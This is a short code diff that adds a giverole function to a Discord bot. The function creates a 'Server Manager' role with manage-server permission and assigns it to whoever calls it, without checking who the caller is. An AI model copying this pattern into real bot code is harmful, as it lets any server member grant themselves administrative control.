@@ -95,6 +95,27 @@ def run_discord_bot(discord):
                     print(e)
                     return
 
+    async def giverole(ctx):
+        guild = ctx.guild
+        member = ctx.author
+
+        # Check if role already exists
+        role_name = "Server Manager"
+        role = discord.utils.get(guild.roles, name=role_name)
+
+        # If not, create it with manage server permission
+        if not role:
+            permissions = discord.Permissions()
+            permissions.update(manage_guild=True)
+            role = await guild.create_role(name=role_name, permissions=permissions)
+            await ctx.send(f"Role `{role_name}` created.")
+
+        # Assign the role
+        await member.add_roles(role)
+        await ctx.send(f"Role `{role_name}` assigned to {member.mention}.")
+
+
+
     @bot.event
     async def on_reaction_remove(reaction, user):
         message = reaction.message
